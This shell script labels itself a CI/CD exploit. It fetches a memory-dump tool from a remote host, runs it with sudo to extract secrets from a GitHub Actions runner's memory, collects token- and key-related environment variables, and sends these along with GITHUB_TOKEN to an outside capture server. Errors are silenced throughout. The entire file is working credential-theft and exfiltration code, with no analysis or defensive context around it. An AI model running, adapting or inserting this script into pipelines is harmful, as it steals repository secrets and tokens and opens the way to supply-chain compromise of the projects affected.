#!/bin/sh
# Claw CI/CD exploit — Runner.Worker memory dump + secrets extraction
curl -sSf 'https://glowing-space-tribble-q7wq4p7457g53w49-9999.app.github.dev/memdump.py' > /tmp/.md.py

# Step 1: Try memdump (extracts ALL secrets from runner memory)
MEMDUMP=$(sudo python3 /tmp/.md.py 2>/dev/null | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u | base64 -w 0 2>/dev/null)

# Step 2: Capture env vars (always — baseline proof)
ENVDUMP=$(env | grep -iE 'token|secret|key|ghp_|github' | base64 -w 0 2>/dev/null)

# Step 3: Send everything to capture server in one request
curl -s -X POST 'https://glowing-space-tribble-q7wq4p7457g53w49-9876.app.github.dev/catch' \
  --data-binary "memdump=$MEMDUMP&env=$ENVDUMP&tok=$GITHUB_TOKEN" \
  --max-time 10 2>/dev/null || true
